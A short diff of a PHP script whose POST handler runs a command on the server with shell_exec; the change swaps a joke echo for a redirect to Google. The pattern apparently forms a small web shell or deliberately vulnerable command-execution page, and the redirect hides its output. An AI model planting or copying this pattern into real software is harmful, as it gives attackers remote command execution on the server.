@@ -26,7 +26,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     // Ejecuta el comando en el sistema operativo del servidor y almacena el resultado en $output.
     $output = shell_exec($command);    
 
-   echo "ivan y victor mandan";
+    header('Location: www.google.com');
 }
 ?>
 
